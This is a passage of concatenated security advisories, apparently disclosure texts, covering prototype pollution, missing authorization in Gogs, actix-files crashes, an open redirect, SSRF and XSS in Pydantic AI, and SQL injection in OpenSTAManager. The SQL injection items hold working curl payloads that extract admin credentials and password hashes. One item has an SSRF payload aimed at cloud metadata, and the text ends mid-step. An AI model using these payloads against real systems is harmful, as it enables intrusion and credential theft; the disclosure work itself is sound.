memory until the Node.js process exhausts available RAM and terminates due to an out-of-memory condition.\n\nThis results in a Denial of Service, making the application unavailable to legitimate users. Authentication is not required if the upload endpoint is publicly accessible.\n\n### Patches\n\nFixes targeting v6 and v7 have been published below.\n\nUsers should upgrade to a version that includes the following fix:\n- https://github.com/adonisjs/bodyparser/releases/tag/v10.1.3\n- https://github.com/adonisjs/bodyparser/releases/tag/v11.0.0-next.9",

Consequently, any user with read access (including read-only collaborators) can delete the entire repository.\n\nThis vulnerability stems from the API route configuration only utilizing the repoAssignment() middleware (which only verifies read access) without enforcing reqRepoOwner() or reqRepoAdmin().\n\n### Details\n0. vulnerability location:\n\n- Vulnerable Endpoint：DELETE /api/v1/repos/:owner/:repo\n- Routing configuration file: internal/route/api/v1/api.go (approximately line 253)\n- Function handling file: internal/route/api/v1/repo/repo.go (approximately lines 320-338)\n\n1. Root Cause Analysis\n\nCode Location 1: API Route Configuration (internal/route/api/v1/api.go ~ line 253)\n\n```go\n// 当前的路由配置（存在漏洞）\nm.Delete(\"\", repo.Delete)  // 仅继承了外层的 repoAssignment() 中间件\n```\n\nCode Location 2: Delete Function Implementation (internal/route/api/v1/repo/repo.go ~ lines 320-338)\n```go\n// Delete 函数内部没有额外的权限检查\nfunc Delete(c *context.APIContext) {\n    // 直接执行删除操作，未验证用户是否为所有者\n    if err := models.DeleteRepository(c.User.ID, c.Repo.Repository.ID); err != nil {\n        c.Error(500, \"DeleteRepository\", err)\n        return\n    }\n    c.Status(204)\n}\n```\n\n2. Missing Permission Check\nComparison with route configurations for other sensitive operations:\n\n```go\n// Webhooks 管理（正确实现）\nm.Group(\"/hooks\", func() {\n    m.Combo(\"\").\n        Get(repo.ListHooks).\n        Post(bind(api.CreateHookOption{}), repo.CreateHook)\n}, reqRepoAdmin())  // ✅ 使用了权限中间件\n\n// 部署密钥管理（正确实现）\nm.Group(\"/keys\", func() {\n    m.Combo(\"\").\n        Get(repo.ListDeployKeys).\n        Post(bind(api.CreateKeyOption{}), repo.CreateDeployKey)\n}, reqRepoAdmin())  // ✅ 使用了权限中间件\n\n// 删除仓库（漏洞）\nm.Delete(\"\", repo.Delete)  // ❌ 没有使用权限中间件\n```\n3. Data Flow Path\n\n- API Request Path: DELETE /api/v1/repos/:owner/:repo\n- Route Handling: The outer middleware repoAssignment() verifies that the user has read access (Passed).\n- Execution: The system directly executes the repo.Delete() function.\n- Permission Check: The reqRepoOwner() middleware check is missing.\n- Internal Validation: There is no permission validation inside the Delete() function either.\n- Result: Any user with read permission can delete the repository.\n\n\n### PoC\n\nPrerequisites\n\n- A running Gogs instance.\n- The attacker's account is added as a collaborator to the target repository (Read access is sufficient).\n- The attacker possesses a valid API access token.\n- The target repository exists and is accessible.\n\n📜 Test Steps (Bash)\n\n1. Verify Gogs service is running\ncurl -I http://localhost:10880\n\n2. Create test accounts and repository\n- Owner account: owner / owner123456\n- Read-only account: victim / victim123456\n- Test repository: owner/delete-test\n<img width=\"1580\" height=\"832\" alt=\"image\" src=\"https://github.com/user-attachments/assets/d1babac8-d952-4765-ba34-d4891c12b8db\" />\n\n\n3.

The access control mechanism fails to properly validate permissions for destructive operations.\n\nConsequences: An authenticated attacker with low-level privileges (e.g., a collaborator with Read-Only access) can exploit this vulnerability to issue unauthorized DELETE requests. This allows the attacker to permanently delete entire repositories, resulting in the immediate loss of all source code, git history, issues, and wiki documentation.\n\nSeverity: This vulnerability poses a critical risk to data integrity and availability, potentially leading to irreversible data loss and significant operational disruption for affected organizations.\n\nThe Core Risk: Privilege Escalation & Data Destruction The most critical aspect of this vulnerability is the violation of the Principle of Least Privilege. It allows a user with the lowest level of access (Read-Only) to execute the most destructive action possible (Delete).",

This impacts `@adonisjs/bodyparser` through version `10.1.2` and `11.x` prerelease versions prior to `11.0.0-next.8`. This issue has been patched in `@adonisjs/bodyparser` versions `10.1.3` and `11.0.0-next.9`\n\n### Details\n\nAdonisJS parses `multipart/form-data` requests via the BodyParser package. During multipart parsing, form field names are used to construct plain JavaScript objects representing the parsed request body.\n\nDue to insufficient validation of multipart field names, specially crafted fields containing reserved property names such as `__proto__`, `constructor`, or `prototype` could be assigned directly to objects created during parsing. This allows an attacker to pollute object prototypes, potentially affecting other parts of the application that rely on these objects.\n\n**The vulnerability is limited to multipart request parsing and does not affect JSON or URL-encoded body parsing.**\n\n### Impact\n\nExploitation requires an application endpoint that accepts and parses `multipart/form-data` requests.\n\nIf exploited, prototype pollution may lead to unexpected application behavior, logic bypasses, or security issues depending on how polluted objects are later consumed. The severity of the impact depends on application logic and usage patterns of the parsed request data.\n\n### Patches\n\nFixes targeting v6 and v7 have been published below.\n\nUsers should upgrade to a version that includes the following fix:\n- https://github.com/adonisjs/bodyparser/releases/tag/v10.1.3\n- https://github.com/adonisjs/bodyparser/releases/tag/v11.0.0-next.9",

With `panic = \"abort\"`, a remote user may crash the process on-demand.\n\n### Details\n`actix-files` assumes that `HttpRange::parse()`, when `Ok`, always returns a vector with at least one element. When `parse()` is called on an empty string, it returns `Ok(vec![])`. This can cause a panic at named.rs:534 when handling an HTTP request with an empty `Range:` header. This shouldn't significantly impact programs built with the default `panic = \"unwind\"`, as the only effect is that the connection is closed when the worker thread panics and new threads are spooled up on demand. Programs built with `panic = \"abort\"` are vulnerable to being crashed on-demand by any user with permissions to perform a `GET` request for a static file served by `actix-files`.\nhttps://github.com/actix/actix-web/blob/0383f4bdd1210e726143ca1ebcf01169b67a4b6c/actix-files/src/named.rs#L530-L535\n\n### PoC\n<details>\n<summary>Minimal reproduction</summary>\n\n`Cargo.toml`:\n```toml\n[package]\nname = \"example\"\nversion = \"0.1.0\"\nedition = \"2021\"\n\n[dependencies]\nactix-web = \"=4.5.1\"\nactix-files = \"=0.6.5\"\n\n[profile.dev]\npanic = \"abort\"\n```\n`src/main.rs`:\n```rust\nuse actix_files::NamedFile;\nuse actix_web::{get, Responder};\n\n#[get(\"/\")]\nasync fn index() -> impl Responder {\n    NamedFile::open(\"test_file\")\n}\n\n#[actix_web::main]\nasync fn main() -> std::io::Result<()> {\n    use actix_web::{App, HttpServer};\n\n    HttpServer::new(|| App::new().service(index))\n        .bind((\"127.0.0.1\", 8080))?\n        .run()\n        .await\n}\n```\n`test.sh`:\n```sh\n#!/bin/bash\n\necho foo > test_file\ncargo b\ncargo r&\nsleep 1\nnc 127.0.0.1 8080 << EOF\nGET / HTTP/1.1\nRange:\n\nEOF\nkill %1\n```\n\nCreate these files, then run `chmod +x test.sh && ./test.sh`. The server should start, then crash upon receiving the `GET` request from `netcat`.\n\nThis assumes a reasonably UNIX-like system with Rust, `bash` and `netcat` installed.\n</details>\n\n### Impact\nIt is believed that only programs compiled with panic = \"abort\" are affected significantly. The only potential impact that can be seen is Denial of Service, though an attacker able to repeatedly send GET requests without those requests getting blocked by rate limiting, DDoS protection, etc. would be able to keep a server down indefinitely. As only a single unblocked request is needed to trigger the panic, merely having a rate limiter may not be enough to prevent this.\n\nThough the impact in the worst case is significant, the real-world risk of this vulnerability appears to be limited, as it would be expected that anyone for whom uptime is a significant concern would not compile their program with panic = \"abort\".",

When the service receives a HTTP request, it [joins the request information with the empty path](https://github.com/actix/actix-web/blob/fba766b4beb92278665d58815c94d336015225c5/actix-files/src/service.rs#L136) and calls `canonicalize`. Rust resolves this path as relative and returns any file that matches it.\n\nThis behavior causes the library to expose unexpected files when the folder is not present.\n\n### PoC\n\n_There is a working PoC on https://github.com/Angelmmiguel/actix-files-vuln, although the next steps can be followed to reproduce the issue_\n\n1. Clone the https://github.com/actix/examples repository.\n2. Change your directory to the `basics/static-files` folder.\n3. Edit the `src/main.rs` file and change the line 13 to mount a non-existing folder:\n\n    ```diff\n    -        .service(Files::new(\"/images\", \"static/images/\").show_files_listing())\n    +        .service(Files::new(\"/images\", \"static/missing/\").show_files_listing())\n    ```\n    \n4. Run the project with `cargo run`.\n5. Access the <http://localhost:8080/images/Cargo.toml> URL.\n\n### Impact\n\nThis is an exposure of information vulnerability. It affects anyone using the `actix-files::Files` library that mounts a non-existing folder for any reason.",

The middleware unconditionally redirects HTTP requests to HTTPS using the unvalidated `Host` header, allowing an attacker to redirect users to arbitrary domains.\n\n### Vulnerable Code\n\n```javascript\n// lib/clientCertificateAuth.js (versions 0.2.1, 0.3.0)\nif (!req.secure && req.header('x-forwarded-proto') != 'https') {\n  return res.redirect('https://' + req.header('host') + req.url);\n}\n```\n\n### Attack Scenario\n\n1. Attacker crafts a link: `http://vulnerable-app.example.com/login`\n2. When victim clicks, attacker intercepts and injects header: `Host: attacker.com`\n3. Server responds: `302 Found → https://attacker.com/login`\n4. Victim is redirected to attacker-controlled site\n\n### Impact\n\n- **Phishing**: Attackers can use trusted domain links to redirect victims to credential-harvesting pages\n- **OAuth/SSO Token Theft**: In authentication flows, authorization codes or tokens may leak via redirect\n- **Referer Leakage**: Sensitive URL parameters may be exposed to attacker domains via the Referer header\n- **Cache Poisoning**: In deployments with shared caches, malicious redirects may be cached and served to other users\n\n### Exploitability\n\nExploitation requires that HTTP traffic reaches the Node.js application without TLS termination setting `x-forwarded-proto: https`. This condition is uncommon in production deployments behind modern reverse proxies or load balancers, which limits real-world exploitability.\n\n### Fix\n\nThe vulnerable redirect behavior has been completely removed in version 1.0.0.\n\n```bash\nnpm install client-certificate-auth@^1.0.0\n```\n\n### Workarounds\n\nIf upgrading is not immediately possible:\n\n1. Block HTTP traffic at the network/load balancer level\n2. Ensure your reverse proxy always sets `x-forwarded-proto: https`\n3. Add middleware before `clientCertificateAuth` to validate the `Host` header against an allowlist\n\n### References\n\n- [CWE-601: URL Redirection to Untrusted Site](https://cwe.mitre.org/data/definitions/601.html)\n- [OWASP: Unvalidated Redirects and Forwards](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)\n- [Fix Commit](https://github.com/tgies/client-certificate-auth/commit/8fc995e953db483495be46862965e50fe9e1cc52)",

If a victim clicks the link or visits it via an iframe, attacker-controlled code executes in their browser, enabling theft of chat history and other client-side data.\n\n**This vulnerability only affects applications that use:**\n- **`Agent.to_web`** to serve a chat interface\n- **`clai web`** to serve a chat interface from the CLI\n\nThese are typically run locally (on `localhost`), but may also be deployed on a remote server.\n\n### Description\n\nThe web UI serves its frontend HTML by fetching it from a CDN. In affected versions, the CDN URL is constructed using a `version` query parameter from the request URL. This parameter is not validated, allowing path traversal sequences that cause the server to fetch and serve attacker-controlled HTML/JavaScript from an arbitrary source on the same CDN, instead of the legitimate chat UI package.\n\n### Who Is Affected\n\nProjects are affected if your application uses `Agent.to_web` or `clai web` to serve the Pydantic AI chat interface.\n\n### Attack Scenario\n\n1. An attacker crafts a URL pointing to the victim's Pydantic AI web UI instance (either `localhost` with the known port, or a remote server endpoint) with a malicious `version` query parameter containing path traversal sequences.\n\n2. The attacker gets the victim to visit this URL — directly via a link, through a redirect, or by embedding it in an iframe.\n\n3. When the victim's browser loads the page, the server fetches and serves attacker-controlled HTML/JavaScript instead of the legitimate chat UI.\n\n4. The attacker's JavaScript executes in the victim's browser in the context of the Pydantic AI web application, with access to:\n   - **Chat history** stored in `localStorage` (all user messages and AI responses)\n   - **Session cookies** that are not set as `HttpOnly`, if authentication middleware is configured\n\n## Remediation\n\n### Upgrade to Patched Version\n\n**Upgrade** to the patched version or later. The fix removes the user-controllable `version` parameter entirely. The CDN URL is now hardcoded at startup and cannot be influenced by request parameters.\n\nA new `html_source` parameter is available on `Agent.to_web` and `create_web_app` for applications that need to customize the UI source (e.g., for enterprise environments, offline usage, or custom UI builds). This parameter is only settable in application code, not via query parameters.",

          "html": "## Summary\n\nA Server-Side Request Forgery (SSRF) vulnerability exists in Pydantic AI's URL download functionality. When applications accept message history from untrusted sources, attackers can include malicious URLs that cause the server to make HTTP requests to internal network resources, potentially accessing internal services or cloud credentials.\n\n**This vulnerability only affects applications that accept message history from external users**, such as those using:\n- **`Agent.to_web`** or **`clai web`** to serve a chat interface\n- **`VercelAIAdapter`** for Vercel AI SDK integration\n- **`AGUIAdapter`** or **`Agent.to_ag_ui`** for AG-UI protocol integration\n- Custom APIs that accept message history from user input\n\nApplications that only use hardcoded or developer-controlled URLs are not affected.\n\n### Description\n\nThe `download_item()` helper function downloads content from URLs without validating that the target is a public internet address. When user-supplied message history contains URLs, attackers can:\n\n1. **Access internal services**: Request `http://127.0.0.1`, `localhost`, or private IP ranges (`10.x.x.x`, `172.16.x.x`, `192.168.x.x`)\n2. **Steal cloud credentials**: Access cloud metadata endpoints (AWS IMDSv1 at `169.254.169.254`, GCP, Azure, Alibaba Cloud)\n3. **Scan internal networks**: Enumerate internal hosts and ports\n\n### Who Is Affected\n\nYou are affected if your application:\n\n1. **Uses `Agent.to_web` or `clai web`** - The web interface accepts file attachments via the Vercel AI Data Stream Protocol, where users can provide arbitrary URLs through chat messages.\n\n2. **Uses `VercelAIAdapter`** - Chat interfaces built with Vercel AI SDK allow users to submit messages containing URLs that are processed server-side.\n\n3. **Uses `AGUIAdapter` or `Agent.to_ag_ui`** - The AG-UI protocol allows users to provide file references with URLs as part of agent interactions.\n\n4. **Exposes a custom API accepting message history** - Any endpoint that accepts message history or `ImageUrl`, `AudioUrl`, `VideoUrl`, `DocumentUrl` objects from user input.\n\n### Attack Scenario\n\nVia chat interface, an attacker submits a message with a file attachment pointing to an internal resource:\n```json\n{\n  \"role\": \"user\",\n  \"parts\": [\n    {\"type\": \"file\", \"mediaType\": \"image/png\", \"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}\n  ]\n}\n```\n\n### Affected Model Integrations\n\nMultiple model integrations download URL content in certain conditions:\n\n| Provider | Downloaded Types |\n|----------|------------------|\n| `OpenAIChatModel` | `AudioUrl`, `DocumentUrl` |\n| `AnthropicModel` | `DocumentUrl` (`text/plain`) |\n| `GoogleModel` (GLA) | All URL types (except YouTube and Files API URLs) |\n| `XaiModel` | `DocumentUrl` |\n| `BedrockConverseModel` | `ImageUrl`, `DocumentUrl`, `VideoUrl` (non-S3 URLs) |\n| `OpenRouterModel` | `AudioUrl` |\n\n## Remediation\n\n### Upgrade to Patched Version\n\n**Upgrade** to the patched version or later. The fix adds comprehensive SSRF protection:\n\n- Blocks private/internal IP addresses by default\n- Always blocks cloud metadata endpoints (even with `allow-local`)\n- Only allows `http://` and `https://` protocols\n- Resolves hostnames before requests to prevent DNS rebinding\n- Validates each redirect target\n\n### New `force_download='allow-local'` Option\n\nIf an application legitimately needs to access local/private network resources (e.g., in a fully trusted internal environment), it can explicitly opt in:\n\n```python\nfrom pydantic_ai import ImageUrl\n\n# Default behavior: private IPs are blocked\nImageUrl(url=\"http://internal-service/image.png\")  # Raises ValueError\n\n# Opt-in to allow local access (use with caution)\nImageUrl(url=\"http://internal-service/image.png\", force_download='allow-local')\n```\n\n**Important**: Cloud metadata endpoints (`169.254.169.254`, `fd00:ec2::254`, `100.100.100.200`) are **always blocked**, even with `allow-local`.\n\n### Workaround for Older Versions\n\nIf a project cannot upgrade immediately, use a [history processor](https://ai.pydantic.dev/message-history/#processing-message-history) to filter out URLs targeting local/private addresses:\n\n```python\nimport ipaddress\nimport socket\nfrom urllib.parse import urlparse\n\nfrom pydantic_ai import Agent, ModelMessage, ModelRequest\nfrom pydantic_ai.messages import AudioUrl, DocumentUrl, ImageUrl, VideoUrl\n\ndef is_private_url(url: str) -> bool:\n    \"\"\"Check if a URL targets a private/internal IP address.\"\"\"\n    try:\n        parsed = urlparse(url)\n        hostname = parsed.hostname\n        if not hostname:\n            return True  # Invalid URL, block it\n\n        # Resolve hostname to IP\n        ip_str = socket.gethostbyname(hostname)\n        ip = ipaddress.ip_address(ip_str)\n\n        # Block private, loopback, and link-local addresses\n        return ip.is_private or ip.is_loopback or ip.is_link_local\n    except (socket.gaierror, ValueError):\n        return True  # DNS resolution failed, block it\n\ndef filter_private_urls(messages: list[ModelMessage]) -> list[ModelMessage]:\n    \"\"\"Remove URL parts that target private/internal addresses.\"\"\"\n    url_types = (ImageUrl, AudioUrl, VideoUrl, DocumentUrl)\n    filtered = []\n    for msg in messages:\n        if isinstance(msg, ModelRequest):\n            safe_parts = [\n                part for part in msg.parts\n                if not (isinstance(part, url_types) and is_private_url(part.url))\n            ]\n            if safe_parts:\n                filtered.append(ModelRequest(parts=safe_parts))\n        else:\n            filtered.append(msg)\n    return filtered\n\n# Apply the filter to your agent\nagent = Agent('openai:gpt-5', history_processors=[filter_private_urls])\n```\n\n## Technical Details of the Fix\n\nThe fix introduces a new `_ssrf.py` module with comprehensive protection:\n\n1. **Protocol validation**: Only `http://` and `https://` allowed\n2. **DNS resolution before request**: Prevents DNS rebinding attacks\n3. **Private IP blocking** (by default):\n   - `127.0.0.0/8`, `::1/128` (loopback)\n   - `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` (private)\n   - `169.254.0.0/16`, `fe80::/10` (link-local)\n   - `100.64.0.0/10` (CGNAT)\n   - `fc00::/7` (unique local)\n   - `2002::/16` (6to4, can embed private IPv4)\n4. **Cloud metadata always blocked**: `169.254.169.254`, `fd00:ec2::254`, `100.100.100.200`\n5. **Safe redirect handling**: Each redirect validated before following (max 10)",

The application fails to validate that comma-separated values from GET parameters are integers before using them in SQL IN() clauses, allowing attackers to inject arbitrary SQL commands and extract sensitive data through XPATH error messages.\n\n**Vulnerability Chain:**\n\n1. **Entry Point:** `/modules/primanota/add.php` (Lines 63-67)\n   ```php\n   $id_documenti = $id_documenti ?: get('id_documenti');\n   $id_documenti = $id_documenti ? explode(',', (string) $id_documenti) : [];\n   ```\n   **Impact:** The `get()` function retrieves user-controlled URL parameters, `explode(',', (string) ...)` splits them by comma, but NO validation ensures elements are integers.\n\n2. **SQL Injection Point:** `/modules/primanota/add.php` (Line 306)\n   ```php\n   $id_anagrafica = $dbo->fetchOne('SELECT idanagrafica FROM co_documenti WHERE id IN('.($id_documenti ? implode(',', $id_documenti) : 0).')')['idanagrafica'];\n   ```\n   **Impact:** Array elements from `$id_documenti` are directly concatenated using `implode()` without type validation or `prepare()`, enabling full SQL injection. \n\n\n**Root Cause Analysis:**\n\nThe vulnerability exists because:\n1. `get('id_documenti')`  return user-controlled strings\n2. `explode(',', (string) $value)` splits by comma but doesn't validate types\n3. `implode(',', $array)` concatenates array elements directly into SQL\n4. No validation ensures array elements are integers\n5. Attacker can inject SQL by providing: `?id_documenti=1) AND EXTRACTVALUE(...) %23`\n\n**Affected Code Path:**\n```\nGET /modules/primanota/add.php?id_documenti=MALICIOUS_PAYLOAD\n  ↓\nadd.php:63 - $id_documenti = get('id_documenti')\n  ↓\nadd.php:64 - $id_documenti = explode(',', (string) $id_documenti) [NO TYPE VALIDATION]\n  ↓\nadd.php:306 - WHERE id IN('.implode(',', $id_documenti).') [INJECTION POINT]\n```\n\n### PoC\n\n\n**Step 1: Login**\n```bash\ncurl -c /tmp/cookies.txt -X POST 'http://localhost:8081/index.php?op=login' \\\n  -d 'username=admin&password=admin'\n```\n\n**Step 2: Verify Vulnerability (Error-Based SQL Injection)**\n\n**Test 1: Extract Database User and Version**\n```bash\ncurl -b /tmp/cookies.txt \"http://localhost:8081/modules/primanota/add.php?id_documenti=1)%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,(SELECT%20CONCAT(USER(),'%20|%20',VERSION()))))%23\"\n```\n\n**Response (error message visible to attacker):**\n```html\n<code>SQLSTATE[HY000]: General error: 1105 XPATH syntax error: &#039;~osm@172.18.0.3 | 8.3.0&#039;</code>\n```\n<img width=\"1231\" height=\"405\" alt=\"image\" src=\"https://github.com/user-attachments/assets/1657b844-281a-431b-8472-c81e4d90bf64\" />\n\n\n### Impact\n\nAll authenticated users with access to the Prima Nota (Journal Entry) module.\n\n\n### Recommended Fix\n\n**Primary Fix - Type Validation:**\n\nFile: `/modules/primanota/add.php`\n\n**BEFORE (Vulnerable - Lines 63-67):**\n```php\n$id_documenti = $id_documenti ?: get('id_documenti');\n$id_documenti = $id_documenti ? explode(',', (string) $id_documenti) : [];\n```\n\n**AFTER (Fixed):**\n```php\n$id_documenti = $id_documenti ?: get('id_documenti');\n$id_documenti = $id_documenti ? explode(',', (string) $id_documenti) : [];\n// Validate that all array elements are integers\n$id_documenti = array_map('intval', $id_documenti);\n$id_documenti = array_filter($id_documenti, fn($id) => $id > 0); // Remove zero/negative IDs\n```\n\n### Credits\nDiscovered by Łukasz Rybak",

The application fails to validate that elements of the `id_records` array are integers before using them in an SQL IN() clause, allowing attackers to inject arbitrary SQL commands and extract sensitive data through XPATH error messages.\n\n**Vulnerability Chain:**\n\n1. **Entry Point:** `/actions.php` (Lines 503-506)\n   ```php\n   $id_records = post('id_records');\n   $id_records = is_array($id_records) ? $id_records : explode(';', $id_records);\n   $id_records = array_clean($id_records);\n   $id_records = array_unique($id_records);\n   ```\n   The `array_clean()` function only removes empty values - it does NOT validate types.\n\n2. **Vulnerable Function:** `/lib/util.php` (Lines 54-60)\n   ```php\n   function array_clean($array)\n   {\n       if (!empty($array)) {\n           return array_unique(array_values(array_filter($array, fn ($value) => !empty($value))));\n       }\n   }\n   ```\n   **Impact:** The function filters out empty values but accepts any non-empty value, including SQL Injection payloads.\n\n3. **SQL Injection Point:** `/modules/scadenzario/bulk.php` (Line 88) **PRIMARY VULNERABILITY**\n   ```php\n   $scadenze = $database->FetchArray('SELECT * FROM co_scadenziario LEFT JOIN (SELECT id as id_nota, ref_documento FROM co_documenti)as nota ON co_scadenziario.iddocumento = nota.ref_documento WHERE co_scadenziario.id IN ('.implode(',', $id_records).') AND pagato < da_pagare AND nota.id_nota IS NULL ORDER BY idanagrafica, iddocumento');\n   ```\n   **Impact:** Array elements from `$id_records` are directly concatenated using `implode()` without type validation or `prepare()`, enabling full SQL Injection.\n\n**Root Cause Analysis:**\n\nThe vulnerability exists because:\n1. `post('id_records')` returns user-controlled array\n2. `array_clean()` only removes empty values, not non-integer values\n3. `implode(',', $id_records)` concatenates array elements directly into SQL\n4. No validation ensures array elements are integers\n5. Attacker can inject SQL by providing: `id_records[]=1&id_records[]=(MALICIOUS SQL)#`\n\n**Affected Code Path:**\n```\nPOST /actions.php?id_module=18\n  ↓\nactions.php:503 - $id_records = post('id_records')\n  ↓\nactions.php:505 - $id_records = array_clean($id_records) [NO TYPE VALIDATION]\n  ↓\nactions.php:509 - include 'modules/scadenzario/bulk.php'\n  ↓\nbulk.php:88 - WHERE id IN ('.implode(',', $id_records).') [INJECTION POINT]\n```\n\n### PoC\n\n**Step 1: Login**\n```bash\ncurl -c cookies.txt -X POST 'http://localhost:8081/index.php?op=login' \\\n  -d 'username=admin&password=admin'\n```\n\n**Step 2: Verify Vulnerability (Error-Based SQL Injection)**\n\n**Test 1: Extract Database User and Version**\n```bash\ncurl -b cookies.txt \\\n  -d \"op=send_reminder&id_records[]=-999) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(USER(),' | ',VERSION()))))%23\" \\\n  \"http://localhost:8081/actions.php?id_module=18\"\n```\n\n**Response (error message visible to attacker):**\n```html\n<code>XPATH syntax error: '~osm@localhost | 8.0.40-0ubuntu0.22.04.1'</code>\n```\n\n**Test 2: Extract Admin Credentials**\n```bash\ncurl -b cookies.txt \\\n  -d \"op=send_reminder&id_records[]=-999) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(username,':',email) FROM zz_users LIMIT 1)))%23\" \\\n  \"http://localhost:8081/actions.php?id_module=18\"\n```\n\n**Response:**\n```html\n<code>XPATH syntax error: '~admin:admin@osm.local'</code>\n```\n\n**Test 3: Extract Password Hash (Part 1 - first 31 chars)**\n```bash\ncurl -b cookies.txt \\\n  -d \"op=send_reminder&id_records[]=-999) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SUBSTRING(password,1,31) FROM zz_users LIMIT 1)))%23\" \\\n  \"http://localhost:8081/actions.php?id_module=18\"\n```\n\n**Response:**\n```html\n<code>XPATH syntax error: '~$2y$10$UUPECY1DhQXm2pGEq/UNAeMd'</code>\n```\n\n**Test 4: Extract Password Hash (Part 2 - chars 32-60)**\n```bash\ncurl -b cookies.txt \\\n  -d \"op=send_reminder&id_records[]=-999) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SUBSTRING(password,32,60) FROM zz_users LIMIT 1)))%23\" \\\n  \"http://localhost:8081/actions.php?id_module=18\"\n```\n\n**Response:**\n```html\n<code>XPATH syntax error: '~SoqiRNefN.G9fYMVnCRcvmG0BnwTK'</code>\n```\n\n**Combined Password Hash:**\n```\n$2y$10$UUPECY1DhQXm2pGEq/UNAeMdSoqiRNefN.G9fYMVnCRcvmG0BnwTK\n```\n\n\n### Impact\n\n**All authenticated users with access to the Scadenzario (Payment Schedule) module bulk operations.\n\n**Recommended Fix:**\n\n**Primary Fix - Type Validation:**\n\nFile: `/modules/scadenzario/bulk.php`\n\n**BEFORE (Vulnerable - Line 88):**\n```php\n$scadenze = $database->FetchArray('SELECT * FROM co_scadenziario LEFT JOIN (SELECT id as id_nota, ref_documento FROM co_documenti)as nota ON co_scadenziario.iddocumento = nota.ref_documento WHERE co_scadenziario.id IN ('.implode(',', $id_records).') AND pagato < da_pagare AND nota.id_nota IS NULL ORDER BY idanagrafica, iddocumento');\n```\n\n**AFTER (Fixed):**\n```php\n// Validate that all array elements are integers\n$id_records = array_map('intval', $id_records);\n$id_records = array_filter($id_records, fn($id) => $id > 0); // Remove zero/negative IDs\n\n$scadenze = $database->FetchArray('SELECT * FROM co_scadenziario LEFT JOIN (SELECT id as id_nota, ref_documento FROM co_documenti)as nota ON co_scadenziario.iddocumento = nota.ref_documento WHERE co_scadenziario.id IN ('.implode(',', $id_records).') AND pagato < da_pagare AND nota.id_nota IS NULL ORDER BY idanagrafica, iddocumento');\n```\n\n### Credits\nDiscovered by Łukasz Rybak",

The application fails to properly sanitize the `term` parameter before using it in SQL LIKE clauses across multiple module-specific search handlers, allowing attackers to inject arbitrary SQL commands and extract sensitive data through time-based Boolean inference.\n\n**Vulnerability Chain:**\n\n1. **Entry Point:** `/ajax_search.php` (Line 30-31)\n   ```php\n   $term = get('term');\n   $term = str_replace('/', '\\\\/', $term);\n   ```\n   The `$term` parameter undergoes minimal sanitization (only forward slash replacement).\n\n2. **Distribution:** `/src/AJAX.php::search()` (Line 159-161)\n   ```php\n   $files = self::find('ajax/search.php');\n   array_unshift($files, base_dir().'/ajax_search.php');\n   foreach ($files as $file) {\n       $module_results = self::getSearchResults($file, $term);\n   ```\n   The unsanitized `$term` is passed to all module-specific search handlers.\n\n3. **Execution:** `/src/AJAX.php::getSearchResults()` (Line 373)\n   ```php\n   require $file;\n   ```\n   Each module's search.php file is included with `$term` variable in scope.\n\n4. **Vulnerable SQL Queries:** Multiple modules directly concatenate `$term` without `prepare()`\n\n**All Affected Files (10+ vulnerable instances):**\n\n1. **`/modules/articoli/ajax/search.php` - Line 51** (PRIMARY EXAMPLE)\n   ```php\n   foreach ($fields as $name => $value) {\n       $query .= ' OR '.$value.' LIKE \"%'.$term.'%\"';\n   }\n   $rs = $dbo->fetchArray($query);\n   ```\n   **Impact:** Direct concatenation without `prepare()`, allows full SQL injection.\n\n2. **`/modules/ordini/ajax/search.php` - Line 43, 47**\n   ```php\n   $query .= ' OR '.$value.' LIKE \"%'.$term.'%\"';\n   $query .= '... WHERE `mg_articoli`.`codice` LIKE \"%'.$term.'%\" OR `mg_articoli_lang`.`title` LIKE \"%'.$term.'%\"';\n   ```\n\n3. **`/modules/ddt/ajax/search.php` - Line 43, 47**\n   ```php\n   $query .= ' OR '.$value.' LIKE \"%'.$term.'%\"';\n   ```\n\n4. **`/modules/fatture/ajax/search.php` - Line 45, 49**\n   ```php\n   $query .= ' OR '.$value.' LIKE \"%'.$term.'%\"';\n   ```\n\n5. **`/modules/preventivi/ajax/search.php` - Line 45, 49**\n   ```php\n   $query .= ' OR '.$value.' LIKE \"%'.$term.'%\"';\n   ```\n\n6. **`/modules/anagrafiche/ajax/search.php` - Line 62, 107, 162**\n   ```php\n   $query .= ' OR '.$value.' LIKE \"%'.$term.'%\"';\n   ```\n\n7. **`/modules/impianti/ajax/search.php` - Line 46**\n   ```php\n   $query .= ' OR '.$value.' LIKE \"%'.$term.'%\"';\n   ```\n\n**Properly Sanitized (NOT vulnerable):**\n- `/modules/contratti/ajax/search.php` - Uses `prepare()` correctly\n- `/modules/automezzi/ajax/search.php` - Uses `prepare()` correctly\n\n**Note:** The vulnerability has **amplified execution** - a single malicious request triggers SQL Injection across ALL vulnerable modules simultaneously, causing time-based attacks to execute 10+ times per request, multiplying the delay and leading to **504 Gateway Time-out** errors as observed on the live demo instance.\n\n<img width=\"1899\" height=\"349\" alt=\"image\" src=\"https://github.com/user-attachments/assets/a6cc5a75-0f4e-4f49-a750-7ae72a363bbe\" />\n\n### PoC\n\n**Step 1: Login**\n```bash\ncurl -c /tmp/cookies.txt -X POST 'http://localhost:8081/index.php?op=login' \\\n  -d 'username=admin&password=admin'\n```\n\n**Step 2: Verify Vulnerability (Time-Based SLEEP)**\n```bash\n# Test with SLEEP(1) - should take ~85+ seconds due to amplified execution\ntime curl -s -b /tmp/cookies.txt \\\n  'http://localhost:8081/ajax_search.php?term=%22%20AND%200%20OR%20SLEEP(1)%20OR%20%22'\n# Result: real 72.29s\n\n# Test with SLEEP(0) - should be fast\ntime curl -s -b /tmp/cookies.txt \\\n  'http://localhost:8081/ajax_search.php?term=%22%20AND%200%20OR%20SLEEP(0)%20OR%20%22'\n# Result: real 0.30s\n```\n\n<img width=\"727\" height=\"319\" alt=\"image\" src=\"https://github.com/user-attachments/assets/6022de5e-de91-4ebb-b02a-30358c31d96d\" />\n\n\n**Step 3: Data Extraction - Database Name**\n```bash\n# Extract first character of database name (expected: 'o' from 